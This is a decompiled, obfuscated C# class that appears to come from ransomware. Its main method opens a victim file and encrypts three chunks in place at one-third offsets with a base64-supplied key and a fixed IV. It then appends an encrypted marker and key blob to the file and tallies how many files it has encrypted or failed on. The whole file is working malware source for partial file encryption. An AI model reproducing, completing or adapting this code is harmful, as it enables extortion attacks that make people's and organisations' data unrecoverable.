using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using ygbKLEHbcCFNE;

namespace coxZRmDhvSAWo;

internal sealed class WZQPKbNkyop
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int eQzZOyoFvxTBVVg(long long_0)
	{
		return (int)long_0;
	}

	public static bool RrUwydtFfvDr(string BMmJgHuoNexSv, string pWPumOOmkubGu, string cDNtgLKmLfquE, byte[] vAbBUExHwKiTnIQlO = null, byte[] AqnhVUGPCwnH = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(BMmJgHuoNexSv, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = eQzZOyoFvxTBVVg(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(pWPumOOmkubGu) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(pWPumOOmkubGu) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(pWPumOOmkubGu) * 1024 * 1024) / 10;
				}
				int snfRzXcWHBtj = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] byte_ = YTKWrkSMDmMfvvA(BMmJgHuoNexSv, fileStream, snfRzXcWHBtj, num * i);
					array = (aSOyqwTwiifNb.uBIPmjbCjNt ? lIsgGRoCjKMwrhD.QpIcrEUyluw(byte_, Convert.FromBase64String(cDNtgLKmLfquE), AqnhVUGPCwnH) : DwwAAJBOSmbJ.ZUYcQJLxxSxnH(byte_, Convert.FromBase64String(cDNtgLKmLfquE), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					baocmedqZxLbBa(BMmJgHuoNexSv, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (aSOyqwTwiifNb.PAOJgADrbjEa ? Encoding.ASCII.GetBytes(aSOyqwTwiifNb.FEZRNsQdHf(getString_0(107397485)) + aSOyqwTwiifNb.FEZRNsQdHf(getString_0(107398526)) + Convert.ToString(pWPumOOmkubGu) + aSOyqwTwiifNb.FEZRNsQdHf(getString_0(107398526))) : Encoding.ASCII.GetBytes(aSOyqwTwiifNb.FEZRNsQdHf(getString_0(107397485)) + aSOyqwTwiifNb.FEZRNsQdHf(getString_0(107398535)) + Convert.ToString(pWPumOOmkubGu) + aSOyqwTwiifNb.FEZRNsQdHf(getString_0(107398535))));
			if (!aSOyqwTwiifNb.PAOJgADrbjEa)
			{
				using FileStream fileStream2 = new FileStream(BMmJgHuoNexSv, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream2 = new FileStream(BMmJgHuoNexSv, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(vAbBUExHwKiTnIQlO, 0, vAbBUExHwKiTnIQlO.Length);
				fileStream2.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (aSOyqwTwiifNb.CCDyMIHlAe)
			{
				try
				{
					File.AppendAllText(aSOyqwTwiifNb.dtHHyJMWMTcTg, getString_0(107386474) + BMmJgHuoNexSv + getString_0(107397504) + ex.Message + getString_0(107395864));
				}
				catch (Exception)
				{
				}
			}
			aSOyqwTwiifNb.LVKhJcfUHGhpJNXz++;
			return false;
		}
		aSOyqwTwiifNb.qXIAEocyZgLqByS++;
		return true;
	}

	public static byte[] YTKWrkSMDmMfvvA(string nnURuLACVDBV, FileStream XhggkduPzGQJoJdi, int SnfRzXcWHBtj, int KMUSwIXERpKA = 0)
	{
		byte[] array = new byte[SnfRzXcWHBtj];
		XhggkduPzGQJoJdi.Position = KMUSwIXERpKA;
		XhggkduPzGQJoJdi.Read(array, 0, SnfRzXcWHBtj);
		return array;
	}

	public static void baocmedqZxLbBa(string VtvNEeVAIxFlx, FileStream VhiqjLTIQOQCpNBF, byte[] USsNJWQuONy, int XbgYacqrvqlEqc = 0)
	{
		VhiqjLTIQOQCpNBF.Position = XbgYacqrvqlEqc;
		VhiqjLTIQOQCpNBF.Write(USsNJWQuONy, 0, USsNJWQuONy.Length);
	}

	static WZQPKbNkyop()
	{
		Strings.CreateGetStringDelegate(typeof(WZQPKbNkyop));
	}
}
